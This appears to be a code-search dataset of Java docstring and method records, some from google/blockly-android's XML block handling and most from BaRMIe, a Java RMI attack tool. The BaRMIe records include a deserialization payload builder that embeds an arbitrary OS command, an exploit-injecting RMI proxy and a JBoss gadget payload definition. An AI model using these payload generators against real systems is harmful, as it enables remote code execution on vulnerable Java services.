{"docstring": "/**\n * Convenience function to load only one Block.\n *\n * @param xml The XML in string form to read the block from.\n * @param blockFactory The BlockFactory for the workspace where the Blocks are being loaded.\n *\n * @return The first Block read from is, or null if no Block was read.\n * @throws BlockLoadingException If any error occurs with the input. It may wrap an IOException\n *                               or XmlPullParserException as a root cause.\n */\n", "func_signal": "@Nullable\npublic static Block loadOneBlockFromXml(String xml, BlockFactory blockFactory)\n        throws BlockLoadingException", "code": "{\n    List<Block> result = new ArrayList<>();\n    loadBlocksFromXml(null, xml, blockFactory, result);\n    if (result.isEmpty()) {\n        return null;\n    }\n    return result.get(0);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Serializes all Blocks in the given list and writes them to the either the output stream or\n * writer, whichever is not null.\n *\n * @param toSerialize A list of Blocks to serialize.\n * @param os An OutputStream to write the blocks to.\n * @param writer A writer to write the blocks to, if {@code os} is null.\n * @param options The options to configure the block serialization. If omitted,\n *                {@link IOOptions#WRITE_ALL_DATA} will be used by default.\n *\n * @throws BlocklySerializerException\n */\n", "func_signal": "public static void writeToXmlImpl(final @NonNull List<Block> toSerialize,\n                                  @Nullable OutputStream os, @Nullable Writer writer,\n                                  @Nullable IOOptions options)\n        throws BlocklySerializerException", "code": "{\n    final IOOptions finalOptions = options == null ? IOOptions.WRITE_ALL_DATA : options;\n    XmlContentWriter contentWriter = new XmlContentWriter() {\n        @Override\n        public void write(XmlSerializer serializer) throws IOException {\n            serializer.setPrefix(\"\", XML_NAMESPACE);\n            serializer.setFeature(\"http://xmlpull.org/v1/doc/features.html#indent-output\", true);\n\n            serializer.startTag(XML_NAMESPACE, \"xml\");\n            for (int i = 0; i < toSerialize.size(); i++) {\n                toSerialize.get(i).serialize(serializer, true, finalOptions);\n            }\n            serializer.endTag(XML_NAMESPACE, \"xml\");\n        }\n    };\n    try {\n        if (os != null) {\n            writeXml(os, contentWriter);\n        } else {\n            writeXml(writer, contentWriter);\n        }\n    } catch (IOException e) {\n        throw new BlocklySerializerException(e);\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Reads the workspace in from a XML stream. This will clear the workspace and replace it with\n * the contents of the xml.\n *\n * @param is The input stream to read from.\n * @throws BlockLoadingException If workspace was not loaded. May wrap an IOException or another\n *                               BlockLoadingException.\n */\n", "func_signal": "public void loadWorkspaceContents(InputStream is) throws BlockLoadingException", "code": "{\n    List<Block> newBlocks = BlocklyXmlHelper.loadFromXml(is, mBlockFactory);\n\n    // Successfully deserialized.  Update workspace.\n    // TODO: (#22) Add proper variable support.\n    // For now just save and restore the list of variables.\n    Set<String> vars = mVariableNameManager.getUsedNames();\n    mController.resetWorkspace();\n    for (String varName : vars) {\n        mController.addVariable(varName);\n    }\n\n    mRootBlocks.addAll(newBlocks);\n    mStats.collectStats(newBlocks, true /* recursive */);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Convenience function to serialize one stack of Blocks (a BlockGroup, effectively).\n *\n * @param rootBlock The root block of the stack to serialize.\n * @param os An OutputStream to which to write them.\n * @param options The options to configure the block serialization. If omitted,\n *                {@link IOOptions#WRITE_ALL_DATA} will be used by default.\n *\n * @throws BlocklySerializerException\n */\n", "func_signal": "public static void writeBlockToXml(@NonNull Block rootBlock, @NonNull OutputStream os,\n                                   @Nullable IOOptions options)\n        throws BlocklySerializerException", "code": "{\n    List<Block> temp = new ArrayList<>();\n    temp.add(rootBlock);\n    writeToXml(temp, os, options);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Creates {@link #mSectionsListView} and configures it with\n * {@link #onCreateSectionsListAdapter()} to use as the activity's navigation menu.\n *\n * @return {@link #mSectionsListView} for the navigation menu.\n */\n", "func_signal": "@Override\nprotected View onCreateAppNavigationDrawer()", "code": "{\n    mSectionsListView = (ListView) getLayoutInflater().inflate(R.layout.sections_list, null);\n    mListAdapter = onCreateSectionsListAdapter();\n    mSectionsListView.setAdapter(mListAdapter);\n    mSectionsListView.setOnItemClickListener(this);\n\n    return mSectionsListView;\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\android\\BlocklySectionsActivity.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Loads a list of top-level Blocks from XML.  Each top-level Block may have many Blocks\n * contained in it or descending from it.\n *\n * @param inStream The input stream to read blocks from. Maybe null.\n * @param inString The xml string to read blocks from if {@code insStream} is null.\n * @param blockFactory The BlockFactory for the workspace where the Blocks are being loaded.\n * @param result An list (usually empty) to append new top-level Blocks to.\n *\n * @throws BlockLoadingException If any error occurs with the input. It may wrap an IOException\n *                               or XmlPullParserException as a root cause.\n */\n", "func_signal": "private static void loadBlocksFromXml(\n        InputStream inStream, String inString, BlockFactory blockFactory, List<Block> result)\n        throws BlockLoadingException", "code": "{\n    StringReader reader = null;\n    try {\n        XmlPullParser parser = PARSER_FACTORY.newPullParser();\n        if (LOG_INPUT_XML) {\n            if (inStream != null) {\n                StringBuilder sb = new StringBuilder();\n                BufferedReader br = new BufferedReader(new InputStreamReader(inStream));\n                String line = br.readLine();\n                while (line != null) {\n                    sb.append(line).append('\\n');\n                    line = br.readLine();\n                }\n                br.close();\n                inStream = null;\n                inString = sb.toString();\n            }\n            Log.d(TAG, \"BlocklyXmlHelper.loadBlocksFromXml()\\n\" + inString);\n        }\n        if (inStream != null) {\n            parser.setInput(inStream, null);\n        } else {\n            reader = new StringReader(inString);\n            parser.setInput(reader);\n        }\n        int eventType = parser.getEventType();\n        while (eventType != XmlPullParser.END_DOCUMENT) {\n            switch (eventType) {\n                case XmlPullParser.START_TAG:\n                    if (parser.getName() == null) {\n                        throw new BlockLoadingException(\"Malformed XML; aborting.\");\n                    }\n                    if (parser.getName().equalsIgnoreCase(\"block\")) {\n                        result.add(blockFactory.fromXml(parser));\n                    } else if (parser.getName().equalsIgnoreCase(\"shadow\")) {\n                        throw new IllegalArgumentException(\n                                \"Shadow blocks may not be top level blocks.\");\n                    }\n                    break;\n\n                default:\n                    break;\n            }\n            eventType = parser.next();\n        }\n    } catch (XmlPullParserException | IOException e) {\n        throw new BlockLoadingException(e);\n    }\n    if (reader != null) {\n        reader.close();\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Convenience function to load only one Block.\n *\n * @param inputXml The input stream of XML from which to read.\n * @param blockFactory The BlockFactory for the workspace where the Blocks are being loaded.\n *\n * @return The first Block read from is, or null if no Block was read.\n * @throws BlockLoadingException If any error occurs with the input. It may wrap an IOException\n *                               or XmlPullParserException as a root cause.\n */\n", "func_signal": "@Nullable\npublic static Block loadOneBlockFromXml(InputStream inputXml, BlockFactory blockFactory)\n        throws BlockLoadingException", "code": "{\n    List<Block> result = new ArrayList<>();\n    loadBlocksFromXml(inputXml, null, blockFactory, result);\n    if (result.isEmpty()) {\n        return null;\n    }\n    if (result.size() > 1) {\n        throw new IllegalStateException(\"Expected one top block. Found \" + result.size() + \".\");\n    }\n    return result.get(0);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Moves {@code trashedBlock} out of {@link #mTrashCategory} and into {@link #mRootBlocks}.\n *\n * @param trashedBlock The {@link Block} to move.\n * @throws IllegalArgumentException When {@code trashedBlock} is not found in\n *         {@link #mTrashCategory}.\n */\n", "func_signal": "public void addBlockFromTrash(Block trashedBlock)", "code": "{\n    boolean foundBlock = mTrashCategory.removeBlock(trashedBlock);\n    if (!foundBlock) {\n        throw new IllegalArgumentException(\"trashedBlock not found in mTrashCategory\");\n    }\n    mRootBlocks.add(trashedBlock);\n    trashedBlock.setEventWorkspaceId(getId());\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * @param text The text to escape.\n * @return\n */\n", "func_signal": "public static String escape(String text)", "code": "{\n    try {\n        StringWriter sw = new StringWriter();\n        XmlSerializer serializer = PARSER_FACTORY.newSerializer();\n        serializer.setOutput(sw);\n        serializer.text(text).flush();\n        return sw.toString();\n    } catch(XmlPullParserException | IOException e) {\n        // Should never get here.\n        throw new IllegalStateException(\"Unable to build/use XmlSerializer.\");\n    }\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\utils\\BlocklyXmlHelper.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/**\n * Add a root block to the trash.\n *\n * @param block The block to put in the trash, possibly with descendants attached.\n */\n// TODO(#56): Make sure the block doesn't have a parent.\n", "func_signal": "public void addBlockToTrash(Block block)", "code": "{\n    BlocklyCategory.BlockItem blockItem = new BlocklyCategory.BlockItem(block);\n    blockItem.getBlock().setEventWorkspaceId(BlocklyEvent.WORKSPACE_ID_TRASH);\n    mTrashCategory.addItem(0, blockItem);\n}", "path": "blocklylib-core\\src\\main\\java\\com\\google\\blockly\\model\\Workspace.java", "repo_name": "google/blockly-android", "stars": 665, "license": "apache-2.0", "language": "java", "size": 7530}
{"docstring": "/*******************\n * Read a TC_STRING element from the stream.\n * \n * TC_STRING\tnewHandle\tutf\n ******************/\n", "func_signal": "private String readTC_STRING()", "code": "{\n\tString val;\n\tbyte b1;\n\t\n\t//TC_STRING\n\tb1 = this._data.pop();\n\tthis.print(\"TC_STRING - 0x\" + this.byteToHex(b1));\n\tif(b1 != (byte)0x74) { throw new RuntimeException(\"Error: Illegal value for TC_STRING (should be 0x74)\"); }\n\t\n\t//Indent\n\tthis.increaseIndent();\n\t\n\t//newHandle\n\tthis.newHandle();\n\t\n\t//UTF\n\tval = this.readUtf();\n\t\n\t//Decrease indent\n\tthis.decreaseIndent();\n\t\n\t//Return the string value\n\treturn val;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a TC_CLASS element from the stream.\n * \n * TC_CLASS\t\tclassDesc\t\tnewHandle\n ******************/\n", "func_signal": "private void readNewClass()", "code": "{\n\tbyte b1;\n\t\n\t//TC_CLASS\n\tb1 = this._data.pop();\n\tthis.print(\"TC_CLASS - 0x\" + this.byteToHex(b1));\n\tif(b1 != (byte)0x76) { throw new RuntimeException(\"Error: Illegal value for TC_CLASS (should be 0x76)\"); }\n\tthis.increaseIndent();\n\t\n\t//classDesc\n\tthis.readClassDesc();\n\t\n\t//newHandle\n\tthis.newHandle();\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Generate payload bytes for the given OS command, correcting references\n * by the given amount.\n * \n * @param cmd The operating system command to execute.\n * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).\n * @return An array of bytes making up the deserialization payload.\n ******************/\n", "func_signal": "public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException", "code": "{\n\tByteArrayOutputStream out;\n\t\n\t//Generate the payload bytes\n\ttry {\n\t\t//Fix references in the header bytes and add them to the output\n\t\tout = new ByteArrayOutputStream();\n\t\tout.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));\n\t\t\n\t\t//Add the middle chunk\n\t\tout.write(this.intToByteArray(765 + cmd.length()));\n\t\tout.write(this.hexStrToByteArray(this._mid_chunk));\n\t\t\n\t\t//Add the command string to the output\n\t\tout.write(this.stringToUtf8ByteArray(cmd));\n\t\t\n\t\t//Fix references in the footer bytes and add them to the output\n\t\tout.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));\n\t} catch(IOException ioe) {\n\t\tthrow new BaRMIeDeserPayloadGenerationException(\"Failed to build Commons Collections 1 deserialization payload.\", ioe);\n\t}\n\t\n\t//Return the payload bytes\n\treturn out.toByteArray();\n}", "path": "src\\nb\\barmie\\modes\\attack\\deser\\payloads\\ROMEPayload2.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a byte field.\n ******************/\n", "func_signal": "private void readByteField()", "code": "{\n\tbyte b1 = this._data.pop();\n\tif(((int)b1) >= 0x20 && ((int)b1) <= 0x7e) {\n\t\t//Print with ASCII\n\t\tthis.print(\"(byte)\" + b1 + \" (ASCII: \" + ((char)b1) + \") - 0x\" + this.byteToHex(b1));\n\t} else {\n\t\t//Just print byte value\n\t\tthis.print(\"(byte)\" + b1 + \" - 0x\" + this.byteToHex(b1));\n\t}\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a fields element from the stream.\n * \n * (short)count\t\tfieldDesc[count]\n ******************/\n", "func_signal": "private void readFields(ClassDataDesc cdd)", "code": "{\n\tbyte b1, b2;\n\tshort count;\n\t\n\t//count\n\tb1 = this._data.pop();\n\tb2 = this._data.pop();\n\tcount = (short)(\n\t\t\t((b1 << 8) & 0xff00) +\n\t\t\t(b2 & 0xff)\n\t);\n\tthis.print(\"fieldCount - \" + count + \" - 0x\" + this.byteToHex(b1) + \" \" + this.byteToHex(b2));\n\t\n\t//fieldDesc\n\tif(count > 0) {\n\t\tthis.print(\"Fields\");\n\t\tthis.increaseIndent();\n\t\tfor(int i = 0; i < count; ++i) {\n\t\t\tthis.print(i + \":\");\n\t\t\tthis.increaseIndent();\n\t\t\tthis.readFieldDesc(cdd);\n\t\t\tthis.decreaseIndent();\n\t\t}\n\t\tthis.decreaseIndent();\n\t}\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a long-UTF string from the stream.\n * \n * (long)length\t\tcontents\n ******************/\n", "func_signal": "private String readLongUtf()", "code": "{\n\tString content = \"\", hex = \"\";\n\tbyte b1, b2, b3, b4, b5, b6, b7, b8;\n\tlong len;\n\t\n\t//Length\n\tb1 = this._data.pop();\n\tb2 = this._data.pop();\n\tb3 = this._data.pop();\n\tb4 = this._data.pop();\n\tb5 = this._data.pop();\n\tb6 = this._data.pop();\n\tb7 = this._data.pop();\n\tb8 = this._data.pop();\n\tlen = (long)(\n\t\t\t((b1 << 56) & 0xff00000000000000L) +\n\t\t\t((b2 << 48) &   0xff000000000000L) +\n\t\t\t((b3 << 40) &     0xff0000000000L) +\n\t\t\t((b4 << 32) &       0xff00000000L) +\n\t\t\t((b5 << 24) &         0xff000000 ) +\n\t\t\t((b6 << 16) &           0xff0000 ) +\n\t\t\t((b7 <<  8) &             0xff00 ) +\n\t\t\t( b8        &               0xff )\n\t);\n\tthis.print(\"Length - \" + len + \" - 0x\" + this.byteToHex(b1) + \" \" + this.byteToHex(b2) + \" \" + this.byteToHex(b3) + \" \" + this.byteToHex(b4) + \" \" +\n\t\t\t   this.byteToHex(b5) + \" \" + this.byteToHex(b6) + \" \" + this.byteToHex(b7) + \" \" + this.byteToHex(b8));\n\t\n\t//Contents\n\tfor(long l = 0; l < len; ++l) {\n\t\tb1 = this._data.pop();\n\t\tcontent += (char)b1;\n\t\thex += this.byteToHex(b1);\n\t}\n\tthis.print(\"Value - \" + content + \" - 0x\" + hex);\n\t\n\t//Return the string\n\treturn content;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a TC_LONGSTRING element from the stream.\n * \n * TC_LONGSTRING\tnewHandle\tlong-utf\n ******************/\n", "func_signal": "private String readTC_LONGSTRING()", "code": "{\n\tString val;\n\tbyte b1;\n\t\n\t//TC_LONGSTRING\n\tb1 = this._data.pop();\n\tthis.print(\"TC_LONGSTRING - 0x\" + this.byteToHex(b1));\n\tif(b1 != (byte)0x7c) { throw new RuntimeException(\"Error: Illegal value for TC_LONGSTRING (should be 0x7c)\"); }\n\t\n\t//Indent\n\tthis.increaseIndent();\n\t\n\t//newHandle\n\tthis.newHandle();\n\t\n\t//long-utf\n\tval = this.readLongUtf();\n\t\n\t//Decrease indent\n\tthis.decreaseIndent();\n\t\n\t//Return the string value\n\treturn val;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a TC_CLASSDESC from the stream.\n * \n * TC_CLASSDESC\t\tclassName\tserialVersionUID\tnewHandle\tclassDescInfo\n ******************/\n", "func_signal": "private ClassDataDesc readTC_CLASSDESC()", "code": "{\n\tClassDataDesc cdd = new ClassDataDesc();\n\tbyte b1;\n\t\n\t//TC_CLASSDESC\n\tb1 = this._data.pop();\n\tthis.print(\"TC_CLASSDESC - 0x\" + this.byteToHex(b1));\n\tif(b1 != (byte)0x72) { throw new RuntimeException(\"Error: Illegal value for TC_CLASSDESC (should be 0x72)\"); }\n\tthis.increaseIndent();\n\t\n\t//className\n\tthis.print(\"className\");\n\tthis.increaseIndent();\n\tcdd.addClass(this.readUtf());\t\t//Add the class name to the class data description\n\tthis.decreaseIndent();\n\t\n\t//serialVersionUID\n\tthis.print(\"serialVersionUID - 0x\" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()) +\n\t\t\t   \" \" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()) + \" \" + this.byteToHex(this._data.pop()));\n\t\n\t//newHandle\n\tcdd.setLastClassHandle(this.newHandle());\t//Set the reference handle for the most recently added class\n\t\n\t//classDescInfo\n\tthis.readClassDescInfo(cdd);\t//Read class desc info, add the super class description to the ClassDataDesc if one is found\n\t\n\t//Decrease the indent\n\tthis.decreaseIndent();\n\t\n\t//Return the ClassDataDesc\n\treturn cdd;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Construct the proxy.\n * \n * @param targetHost The host to forward connections to.\n * @param targetPort The port to forward connections to.\n * @param options The program options.\n * @param payload The exploit payload to inject.\n ******************/\n", "func_signal": "public RMIBindExploitProxy(InetAddress targetHost, int targetPort, ProgramOptions options, byte[] payload)", "code": "{\n\t//Initialise super class\n\tsuper(targetHost, targetPort, options);\n\t\n\t//Store the exploit payload\n\tthis._payload = payload;\n}", "path": "src\\nb\\barmie\\net\\proxy\\RMIBindExploitProxy.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Print a handle value and increment the handle value for the next handle.\n ******************/\n", "func_signal": "private int newHandle()", "code": "{\n\tint handleValue = this._handleValue;\n\t\n\t//Print the handle value\n\tthis.print(\"newHandle 0x\" + this.intToHex(handleValue));\n\t\n\t//Increment the next handle value and return the one we just assigned\n\tthis._handleValue++;\n\treturn handleValue;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a boolean field.\n ******************/\n", "func_signal": "private void readBooleanField()", "code": "{\n\tbyte b1 = this._data.pop();\n\tthis.print(\"(boolean)\" + (b1 == 0 ? \"false\" : \"true\") + \" - 0x\" + this.byteToHex(b1));\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a classDescInfo from the stream.\n * \n * classDescFlags\tfields\tclassAnnotation\tsuperClassDesc\n ******************/\n", "func_signal": "private void readClassDescInfo(ClassDataDesc cdd)", "code": "{\n\tString classDescFlags = \"\";\n\tbyte b1;\n\t\n\t//classDescFlags\n\tb1 = this._data.pop();\n\tif((b1 & 0x01) == 0x01) { classDescFlags += \"SC_WRITE_METHOD | \"; }\n\tif((b1 & 0x02) == 0x02) { classDescFlags += \"SC_SERIALIZABLE | \"; }\n\tif((b1 & 0x04) == 0x04) { classDescFlags += \"SC_EXTERNALIZABLE | \"; }\n\tif((b1 & 0x08) == 0x08) { classDescFlags += \"SC_BLOCKDATA | \"; }\n\tif(classDescFlags.length() > 0) { classDescFlags = classDescFlags.substring(0, classDescFlags.length() - 3); }\n\tthis.print(\"classDescFlags - 0x\" + this.byteToHex(b1) + \" - \" + classDescFlags);\n\t\n\t//Store the classDescFlags\n\tcdd.setLastClassDescFlags(b1);\t\t//Set the classDescFlags for the most recently added class\n\t\n\t//Validate classDescFlags\n\tif((b1 & 0x02) == 0x02) {\n\t\tif((b1 & 0x04) == 0x04) { throw new RuntimeException(\"Error: Illegal classDescFlags, SC_SERIALIZABLE is not compatible with SC_EXTERNALIZABLE.\"); }\n\t\tif((b1 & 0x08) == 0x08) { throw new RuntimeException(\"Error: Illegal classDescFlags, SC_SERIALIZABLE is not compatible with SC_BLOCKDATA.\"); }\n\t} else if((b1 & 0x04) == 0x04) {\n\t\tif((b1 & 0x01) == 0x01) { throw new RuntimeException(\"Error: Illegal classDescFlags, SC_EXTERNALIZABLE is not compatible with SC_WRITE_METHOD.\"); }\n\t} else if(b1 != 0x00) {\n\t\tthrow new RuntimeException(\"Error: Illegal classDescFlags, must include either SC_SERIALIZABLE or SC_EXTERNALIZABLE.\");\n\t}\n\t\n\t//fields\n\tthis.readFields(cdd);\t\t//Read field descriptions and add them to the ClassDataDesc\n\t\n\t//classAnnotation\n\tthis.readClassAnnotation();\n\t\n\t//superClassDesc\n\tcdd.addSuperClassDesc(this.readSuperClassDesc());\t//Read the super class description and add it to the ClassDataDesc\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Convert an int to a hex-ascii string.\n * \n * @param i The int to convert to a string.\n * @return The hex-ascii string representation of the int.\n ******************/\n", "func_signal": "private String intToHex(int i)", "code": "{\n\treturn String.format(\"%02x\", (i & 0xff000000) >> 24) +\n\t\t   String.format(\" %02x\", (i &   0xff0000) >> 16) +\n\t\t   String.format(\" %02x\", (i &     0xff00) >>  8) +\n\t\t   String.format(\" %02x\", (i &       0xff));\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a TC_PROXYCLASSDESC from the stream.\n * \n * TC_PROXYCLASSDESC\tnewHandle\tproxyClassDescInfo\n ******************/\n", "func_signal": "private ClassDataDesc readTC_PROXYCLASSDESC()", "code": "{\n\tClassDataDesc cdd = new ClassDataDesc();\n\tbyte b1;\n\t\n\t//TC_PROXYCLASSDESC\n\tb1 = this._data.pop();\n\tthis.print(\"TC_PROXYCLASSDESC - 0x\" + this.byteToHex(b1));\n\tif(b1 != (byte)0x7d) { throw new RuntimeException(\"Error: Illegal value for TC_PROXYCLASSDESC (should be 0x7d)\"); }\n\tthis.increaseIndent();\n\t\n\t//newHandle\n\t//NB: Not clear whether a TC_PROXYCLASSDESC can be referenced in a classDesc element (e.g. object or array classDesc). Ignore this for now...\n\tthis.newHandle();\n\t\n\t//proxyClassDescInfo\n\tthis.readProxyClassDescInfo(cdd);\t//Read proxy class desc info, add the super class description to the ClassDataDesc if one is found\n\t\n\t//Decrease the indent\n\tthis.decreaseIndent();\n\t\n\t//Return the ClassDataDesc\n\treturn cdd;\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a classAnnotation from the stream.\n * \n * Could be either:\n *\tcontents\n *\tTC_ENDBLOCKDATA\t\t(0x78)\n ******************/\n", "func_signal": "private void readClassAnnotation()", "code": "{\n\t//Print annotation section and indent\n\tthis.print(\"classAnnotations\");\n\tthis.increaseIndent();\n\t\n\t//Loop until we have a TC_ENDBLOCKDATA\n\twhile(this._data.peek() != (byte)0x78) {\n\t\t//Read a content element\n\t\tthis.readContentElement();\n\t}\n\t\n\t//Pop and print the TC_ENDBLOCKDATA element\n\tthis._data.pop();\n\tthis.print(\"TC_ENDBLOCKDATA - 0x78\");\n\t\n\t//Decrease indent\n\tthis.decreaseIndent();\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read an array field.\n ******************/\n", "func_signal": "private void readArrayField()", "code": "{\n\t//Print field type and increase indent\n\tthis.print(\"(array)\");\n\tthis.increaseIndent();\n\t\n\t//Array could be null\n\tswitch(this._data.peek()) {\n\t\tcase (byte)0x70:\t\t//TC_NULL\n\t\t\tthis.readNullReference();\n\t\t\tbreak;\n\t\t\t\n\t\tcase (byte)0x75:\t\t//TC_ARRAY\n\t\t\tthis.readNewArray();\n\t\t\tbreak;\n\t\t\t\n\t\tcase (byte)0x71:\t\t//TC_REFERENCE\n\t\t\tthis.readPrevObject();\n\t\t\tbreak;\n\t\t\t\n\t\tdefault:\t\t\t\t//Unknown\n\t\t\tthrow new RuntimeException(\"Error: Unexpected array field value type (0x\" + this.byteToHex(this._data.peek()));\n\t}\n\t\n\t//Revert indent\n\tthis.decreaseIndent();\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Read a classdata field from the stream.\n * \n * The data type depends on the given field description.\n * \n * @param f A description of the field data to read.\n ******************/\n", "func_signal": "private void readClassDataField(ClassField cf)", "code": "{\n\tbyte b1, b2, b3, b4, b5, b6, b7, b8;\n\t\n\t//Print the field name and indent\n\tthis.print(cf.getName());\n\tthis.increaseIndent();\n\t\n\t//Read the field data\n\tthis.readFieldValue(cf.getTypeCode());\n\t\n\t//Decrease the indent\n\tthis.decreaseIndent();\n}", "path": "src\\nb\\barmie\\util\\SerializationDumper.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Stub to call the remote invoke() method.\n ******************/\n", "func_signal": "public Object invoke(RemoteInvocation ri) throws RemoteException", "code": "{\n\ttry {\n\t\tObject result = this.ref.invoke(this, RmiInvocationHandler.class.getMethod(\"invoke\", new Class[] {RemoteInvocation.class}), new Object[] { ri }, -5752512342587169831L);\n\t\treturn result;\n\t} catch(RuntimeException | RemoteException ex1) {\n\t\tthrow ex1;\n\t} catch(Exception ex2) {\n\t\tthrow new RemoteException(\"Unexpected exception.\", ex2);\n\t}\n}", "path": "src\\org\\springframework\\remoting\\rmi\\RmiInvocationWrapper_Stub.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
{"docstring": "/*******************\n * Set payload properties\n ******************/\n", "func_signal": "public JBossInterceptorsPayload1()", "code": "{\n\tsuper();\n\tthis.setName(\"JBossInterceptors1\");\n\tthis.setDescription(\"JBoss Interceptors API\");\n\tthis.setRemediationAdvice(\"[JBoss] \" + this.REMEDIATION_NO_FIX);\n\tthis.setAffectedJars(new String[] {\n\t\t\"jboss-interceptor-api-1.0.1-CR1.jar\", \"jboss-interceptor-api-1.0.jar\", \"jboss-interceptor-api-1.1-CR1.jar\", \"jboss-interceptor-api-1.1.jar\", \"jboss-interceptor-api-3.1.0-CR1.jar\",\n\t\t\"jboss-interceptor-api-3.1.0-CR2.jar\", \"jboss-interceptor-api-3.1.0-CR3.jar\", \"jboss-interceptor-core-2.0.0.Alpha1.jar\", \"jboss-interceptor-core-2.0.0.Alpha2.jar\", \"jboss-interceptor-core-2.0.0.Alpha3.jar\",\n\t\t\"jboss-interceptor-core-2.0.0.CR1.jar\", \"jboss-interceptor-core-2.0.0.Final.jar\", \"jboss-interceptor-spi-2.0.0.Alpha1.jar\", \"jboss-interceptor-spi-2.0.0.Alpha2.jar\", \"jboss-interceptor-spi-2.0.0.Alpha3.jar\",\n\t\t\"jboss-interceptor-spi-2.0.0.CR1.jar\", \"jboss-interceptor-spi-2.0.0.Final-redhat-1.jar\", \"jboss-interceptor-spi-2.0.0.Final.jar\"\n\t});\n}", "path": "src\\nb\\barmie\\modes\\attack\\deser\\payloads\\JBossInterceptorsPayload1.java", "repo_name": "NickstaDB/BaRMIe", "stars": 681, "license": "mit", "language": "java", "size": 117}
